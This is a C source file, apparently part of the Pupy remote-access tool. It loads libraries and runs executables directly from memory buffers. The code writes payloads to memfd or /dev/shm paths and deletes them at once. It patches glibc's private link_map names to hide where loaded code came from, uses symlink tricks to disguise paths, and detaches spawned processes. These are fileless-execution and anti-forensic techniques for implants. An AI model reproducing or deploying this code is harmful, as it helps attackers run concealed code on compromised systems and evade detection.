#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <limits.h>
#include <fcntl.h>
#include <stdlib.h>
#include <alloca.h>
#include <string.h>
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <link.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <signal.h>
#include <errno.h>

#include "list.h"
#include "tmplibrary.h"
#include "debug.h"

#ifdef Linux
#include "memfd.h"
#endif

#include "decompress.h"

extern char **environ;

/*

  So.. We don't want to bother with reflective bla-bla-bla. Just
  upload buffer to temporary file, load it as a library using standard
  glibc calls, then delete

*/

static inline
const char *gettemptpl() {
    static const char *templates[] = {
#ifdef Linux
        "/dev/shm/XXXXXX",
        "/run/shm/XXXXXX",
        "/run/",
#endif
        "/tmp/XXXXXX",
        "/var/tmp/XXXXXX",
        NULL
    };

    static const char *tmpdir = NULL;
    if (! tmpdir) {
        int i;
        for (i=0; templates[i]; i++) {
            char *buf = alloca(strlen(templates[i]+1));
            strcpy(buf, templates[i]);
            int fd = mkstemp(buf);
            int found = 0;
            if (fd != -1) {
                int page_size = sysconf(_SC_PAGESIZE);
                if (ftruncate(fd, page_size) != -1) {
                    void *map = mmap(
                        NULL,
                        page_size,
                        PROT_READ|PROT_EXEC,
#ifdef Linux
                        MAP_PRIVATE|MAP_DENYWRITE,
#else
                        MAP_PRIVATE,
#endif
                        fd,
                        0
                    );
                    if (map != MAP_FAILED) {
                        munmap(map, page_size);
                        found = 1;
                    } else {
                        dprint("Couldn't use %s -> %m\n", buf);
                    }
                }

                unlink(buf);
                close(fd);

                if (found) {
                    tmpdir = templates[i];
                    break;
                }
            }
            dprint("TRY: %s -> %d (%m)\n", buf, fd);

        }
        if (!tmpdir) {
            abort();
        }
    }

    return tmpdir;
}

typedef struct library {
    const char *name;
    void *base;
} library_t;

bool search_library(void *pState, void *pData) {
    library_t *search = (library_t *) pState;
    library_t *current = (library_t *) pData;

    if (!strcmp(search->name, current->name)) {
        search->base = current->base;
        dprint("FOUND! %s = %p\n", search->name, search->base);

        return true;
    }

    return false;
}

int drop_library(char *path, size_t path_size, const char *buffer, size_t size) {
#if defined(Linux)
    int fd = pupy_memfd_create(path, path_size);
    bool memfd = true;
#elif defined(SunOS)
    char tmp[PATH_MAX] = {};
    snprintf(tmp, sizeof(tmp), "/tmp/%s", path);
    int fd = open(tmp, O_CREAT | O_RDWR, 0600);
    strncpy(path, tmp, path_size);
    bool memfd = false;
#else
    int fd = -1;
    bool memfd = false;
#endif

    if (fd < 0) {
        dprint("pupy_memfd_create() failed: %m\n");
        memfd = false;

        const char *template = gettemptpl();

        if (path_size < strlen(template))
            return -1;

        strcpy(path, template);

        fd = mkstemp(path);
        if (fd < 0) {
            return fd;
        }
    }

    if (size > 2 && buffer[0] == '\x1f' && buffer[1] == '\x8b') {
        dprint("Decompressing library %s\n", path);
        int r = decompress(fd, buffer, size);
        if (!r == 0) {
            dprint("Decompress error: %d\n", r);
            close(fd);
            return -1;
        }
    } else {
        while (size > 0) {
            size_t n = write(fd, buffer, size);
            if (n == -1) {
                dprint("Write failed: %d left, error = %m, buffer = %p, tmpfile = %s\n", size, buffer, path);
                close(fd);
                unlink(path);
                fd = -1;
                break;
            }
            buffer += n;
            size -= n;
        }
    }

#ifdef Linux
    if (memfd) {
        fcntl(fd, F_ADD_SEALS, F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE);
    }
#endif

    return fd;
}

static inline int
set_cloexec_flag (int desc) {
    int oldflags = fcntl (desc, F_GETFD, 0);
    if (oldflags < 0)
        return oldflags;
    oldflags |= FD_CLOEXEC;
    return fcntl (desc, F_SETFD, oldflags);
}

pid_t memexec(const char *buffer, size_t size, const char* const* argv, int stdior[3], bool redirected_stdio, bool detach) {
    dprint("memexec(%p, %ull, %d)\n", buffer, size, redirected_stdio);

    char buf[PATH_MAX]={};
    int fd = drop_library(buf, sizeof(buf), buffer, size);
    if (fd < 0) {
        dprint("Couldn't drop executable: %m\n");
        return -1;
    }

    int p_wait[2];
    int p_stdin[2];
    int p_stdout[2];
    int p_stderr[2];

    if (pipe(p_wait) < 0) {
        dprint("Couldn't create wait pipe: %m\n");
        goto _lbClose;
    }

    if (redirected_stdio) {
        if (pipe(p_stdin) < 0)
            goto _lbClose0;

        if (pipe(p_stdout) < 0)
            goto _lbClose1;

        if (pipe(p_stderr) < 0)
            goto _lbClose2;
    }

    pid_t pid = 0;
    if (detach) {
        pid = fork();
        if (pid == -1) {
            dprint("Couldn't fork: %m\n");
            goto _lbClose3;
        }
    }

    if (!pid) {
        pid = fork();
        if (pid == -1) {
            exit(1);
        }

        if (pid) {
            if (detach) {
                write(p_wait[1], &pid, sizeof(pid));
                exit(0);
            }
        } else {
            if (redirected_stdio) {
                dup2(p_stdin[0], 0);  close(p_stdin[1]);
                dup2(p_stdout[1], 1); close(p_stdout[0]);
                dup2(p_stderr[1], 2); close(p_stderr[0]);
                close(p_wait[0]);
            } else {
                int i;

                if (setsid ( ) == -1)
                    return -1;

                for (i = 0; i < sysconf(_SC_OPEN_MAX); i++)
                    if (i != p_wait[1])
                        close(i);

                open ("/dev/null", O_RDWR);
                dup (0);
                dup (0);
            }

            set_cloexec_flag(p_wait[1]);

            execv(buf, (char *const *) argv);

            int status = errno;
            write(p_wait[1], &status, sizeof(status));
            exit(1);
        }
    }

    close(p_wait[1]);
    p_wait[1] = -1;

    int status = 0;
    int error = 0;
    pid_t child_pid = 0;

    if (detach) {
        if (read(p_wait[0], &child_pid, sizeof(child_pid)) < 0) {
            dprint("Reading child pid failed: %m\n");
            goto _lbClose3;
        }

        if (waitpid(pid, &status, 0) < 0 || WEXITSTATUS(status) != 0) {
            dprint("Invalid child state\n");
            goto _lbClose3;
        }

        dprint("Detached pid catched and closed: %d status=%d\n",
               pid, WEXITSTATUS(status));
    } else {
        child_pid = pid;
    }

    dprint("Wait exec status...\n");

    if (read(p_wait[0], &error, sizeof(error)) < 0) {
        dprint("Reading error failed: %m\n");
        goto _lbClose3;
    }

    dprint("Child error status: %d (%d)\n", error, errno);
    if (error)
        goto _lbClose3;

    dprint("Child at %d\n", child_pid);
    if (redirected_stdio) {
        close(p_stdin[0]);  stdior[0] = p_stdin[1];
        close(p_stdout[1]); stdior[1] = p_stdout[0];
        close(p_stderr[1]); stdior[2] = p_stderr[0];
    }

    close(p_wait[0]);
    close(fd);

#ifdef Linux
    if (!is_memfd_path(buf))
#endif
    unlink(buf);
    return child_pid;

 _lbClose3:
    if (redirected_stdio) {
        close(p_stderr[0]); close(p_stderr[1]);
    }
 _lbClose2:
    if (redirected_stdio) {
        close(p_stdout[0]); close(p_stdout[1]);
    }
 _lbClose1:
    if (redirected_stdio) {
        close(p_stdin[0]); close(p_stdin[1]);
    }
 _lbClose0:
    if (p_wait[0] > 0)
        close(p_wait[0]);
    if (p_wait[1] > 0)
        close(p_wait[1]);

 _lbClose:
    close(fd);
    unlink(buf);

    dprint("Exited with error\n");
    return -1;
}

#if defined(SunOS)
// For some unknown reason malloc doesn't work on newly created LM in Solaris 10
// Fallback to old shitty way of loading libs
// TODO: write own ELF loader
static void *_dlopen(int fd, const char *path, int flags, const char *soname) {
    void *handle = dlopen(path, flags | RTLD_PARENT | RTLD_GLOBAL);
    if (fd != -1) {
        unlink(path);
        close(fd);
    }
    return handle;
}
#elif defined(LM_ID_NEWLM) && defined(Linux)

// Part of private link_map structure

struct libname_list;

struct libname_list {
    char *name;
    struct libname_list *next;
    int dont_free;
};

struct link_map_private;

/* Dangerous! Hacked link_map structure */
struct link_map_private {
    void *l_addr;
    char *l_name;
    void *l_ld;
    struct link_map_private *l_next, *l_prev;

    /* ------------- private part starts here ----------------- */

    struct link_map_private *l_real; // dlmopen
    Lmid_t l_ns;                     // dlmopen
    struct libname_list *l_libname;  // ancient

    /* ------------- .... and there much more ----------------- */


};

static void *_dlopen(int fd, const char *path, int flags, const char *soname) {
    void *handle = NULL;

#if defined(WIP_LMID)
    static Lmid_t lmid = LM_ID_NEWLM;

    flags &= ~RTLD_GLOBAL;

    if ((flags & RTLD_NOLOAD) && (lmid == LM_ID_NEWLM))
	    return NULL;

    handle = dlmopen(lmid, path, flags);
    if (lmid == LM_ID_NEWLM && handle) {
        dlinfo(handle, RTLD_DI_LMID, &lmid);
        dprint("memdlopen - dlmopen - new lmid created: %08x\n", lmid);
    }

#else
    static Lmid_t lmid = LM_ID_BASE;
    handle = dlopen(path, flags);
#endif

    dprint("memdlopen - dlmopen - _dlopen(lmid=%08x, %s, %s)\n", lmid, path, soname);

    if (flags & RTLD_NOLOAD || !handle) {
        return handle;
    }

    bool is_memfd = is_memfd_path(path);
    bool linkmap_hacked = false;

    if (soname) {
        struct link_map_private *linkmap = NULL;
        dlinfo(handle, RTLD_DI_LINKMAP, &linkmap);
        /* If memfd, then try to verify as best as possible that all that
           addresses are valid. If not - there is no reason to touch this
        */

        if (is_memfd) {
            if (linkmap && linkmap->l_ns == lmid &&
                linkmap->l_libname && linkmap->l_libname->name &&
                !strncmp(linkmap->l_name, linkmap->l_libname->name, strlen(linkmap->l_name))) {

                dprint("memdlopen - change l_name %s/%p (%s/%p) -> %s (linkmap: %p)\n",
                       linkmap->l_name, linkmap->l_name,
                       linkmap->l_libname->name,
                       linkmap->l_libname->name,
                       soname, linkmap);

                /* Do not care about leaks. It's not the worst thing to happen */
                linkmap->l_name = strdup(soname);
                linkmap->l_libname->name = strdup(soname);

                linkmap_hacked = true;
            } else {
                dprint("memdlopen - bad signature (lmid=%08x name1=%s name2=%s)\n",
                       linkmap->l_ns, linkmap->l_name, linkmap->l_libname->name);
            }
        }

        if (!is_memfd || linkmap_hacked) {
            /* If linkmap altered or it's not memfd, then delete/close path/fd */
            if (!is_memfd)
                unlink(path);

            close(fd);
        }
    }

    return handle;
}
#else

/* Linux x86 or any other thing */

static void *_dlopen(int fd, const char *path, int flags, const char *soname) {

    /* Try to fallback to symlink hack */

    bool is_memfd = is_memfd_path(path);
    char fake_path[PATH_MAX] = {};

    const char *effective_path = path;

    static const char DROP_PATH[] = "/dev/shm/memfd:";

    if (is_memfd) {
        int i;

        snprintf(fake_path, sizeof(fake_path), "%s%s", DROP_PATH, soname);
        for (i=sizeof(DROP_PATH)-1; fake_path[i]; i++)
            if (fake_path[i] == '/')
                fake_path[i] = '!';

        if (!symlink(path, fake_path)) {
            effective_path = fake_path;
            is_memfd = false;
        } else {
            dprint("symlink error %s -> %s: %m\n", path, fake_path);
        }
    }

    void *handle = dlopen(effective_path, flags);
    if (fd != -1) {
        unlink(effective_path);

        /*
          If all workarounds failed we have nothing to do but leave this as
          is */
        if (!is_memfd)
            close(fd);
    }
    return handle;
}
#endif

void *memdlopen(const char *soname, const char *buffer, size_t size) {
    dprint("memdlopen(\"%s\", %p, %ull)\n", soname, buffer, size);

    static PLIST libraries = NULL;
    if (!libraries) {
        libraries = list_create();
    }

    library_t search = {
        .name = soname,
        .base = NULL,
    };

    if (list_enumerate(libraries, search_library, &search)) {
        dprint("SO %s FOUND: %p\n", search.name, search.base);
        return search.base;
    }

    void *base = _dlopen(-1, soname, RTLD_NOLOAD, NULL);
    if (base) {
        dprint("Library \"%s\" loaded from OS\n", soname);
        return base;
    }

    char buf[PATH_MAX]={};

#if defined(DEBUG) || defined(SunOS)
    if (soname)
        strncpy(buf, soname, sizeof(buf)-1);
#endif

    int fd = drop_library(buf, sizeof(buf)-1, buffer, size);

    if (fd < 0) {
        dprint("Couldn't drop library %s: %m\n", soname);
        return NULL;
    }

    int flags = RTLD_NOW | RTLD_LOCAL;

    dprint("dlopen(%s, %08x)\n", buf, flags);
    base = _dlopen(fd, buf, flags, soname);
    dprint("dlopen(%s, %08x) = %p\n", buf, flags, base);

    if (!base) {
        dprint("Couldn't load library %s (%s): %s\n", soname, buf, dlerror());
        return NULL;
    }

    dprint("Library %s loaded to %p\n", soname, base);

    library_t *record = (library_t *) malloc(sizeof(library_t));
    record->name = strdup(soname);
    record->base = base;
    list_add(libraries, record);
    return base;
}
